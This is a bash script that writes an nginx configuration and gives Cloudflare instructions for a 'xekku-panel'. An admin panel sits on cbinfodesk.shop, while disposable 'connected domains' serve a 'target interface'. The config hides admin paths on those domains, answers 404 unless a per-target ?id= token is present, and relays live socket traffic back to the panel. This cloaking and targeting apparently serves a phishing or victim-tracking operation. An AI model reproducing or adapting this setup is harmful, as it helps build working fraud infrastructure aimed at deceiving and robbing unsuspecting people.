#!/bin/bash

# Fix Cloudflare Error 526 - Invalid SSL Certificate
# For connected domains serving target interfaces

echo "==================================="
echo "  Fixing Cloudflare Error 526      "
echo "==================================="

# Update Nginx configuration to handle connected domains without SSL
echo "--- Updating Nginx configuration for connected domains... ---"

cat <<'EOF' > /etc/nginx/sites-available/xekku-panel
# Default server - handle ALL connected domains (targets only) - HTTP ONLY
server {
    listen 80 default_server;
    server_name _;
    
    # Handle Socket.io for all domains (MUST be first for proper routing)
    location /socket.io/ {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        proxy_buffering off;
    }
    
    # Block admin/login access on all connected domains
    location ~ ^/(admin|login|logout|dashboard) {
        return 404;
    }
    
    # Allow API endpoints needed for target interface
    location /api/ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
    
    # Allow static assets (JS, CSS, images) needed for target interface
    location ~ \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        expires 1h;
        add_header Cache-Control "public, immutable";
    }
    
    # Root path with id parameter for targets
    location = / {
        # Check if id parameter exists
        if ($arg_id = "") {
            return 404;
        }
        
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
    
    # Block all other paths
    location / {
        return 404;
    }
}

# HTTP server - main domain (redirect to HTTPS)
server {
    listen 80;
    server_name cbinfodesk.shop;
    return 301 https://$host$request_uri;
}

# HTTPS server - main domain (full admin access)
server {
    listen 443 ssl;
    server_name cbinfodesk.shop;

    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/cbinfodesk.shop/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cbinfodesk.shop/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

    # Allow all paths on main domain
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    location /socket.io/ {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
EOF

# Test and reload Nginx
echo "--- Testing Nginx configuration... ---"
nginx -t

if [ $? -eq 0 ]; then
    echo "✅ Nginx configuration is valid. Reloading..."
    systemctl reload nginx
    echo "✅ Configuration updated successfully!"
    echo ""
    echo "🌐 DOMAIN CONFIGURATION:"
    echo "   Main Domain (HTTPS): https://cbinfodesk.shop"
    echo "   Connected Domains:   HTTP ONLY (no SSL needed)"
    echo ""
    echo "🔧 CLOUDFLARE SETTINGS NEEDED:"
    echo "   1. Go to Cloudflare Dashboard"
    echo "   2. Select: stephenhawkinswheelchair.fun"
    echo "   3. Go to: SSL/TLS → Overview"
    echo "   4. Set SSL mode to: 'Flexible'"
    echo "   5. Wait 2-3 minutes for changes to propagate"
    echo ""
    echo "🎯 TEST URLS:"
    echo "   Admin:  https://cbinfodesk.shop/admin/login"
    echo "   Target: http://stephenhawkinswheelchair.fun/?id=dXNlcg=="
    echo ""
    echo "💡 WHY THIS WORKS:"
    echo "   - Main domain has SSL certificate (HTTPS)"
    echo "   - Connected domains use HTTP only"
    echo "   - Cloudflare 'Flexible' mode encrypts visitor→CF, CF→server is HTTP"
    echo ""
else
    echo "❌ Nginx configuration has errors. Please check the syntax."
    echo "Error details:"
    nginx -t
    exit 1
fi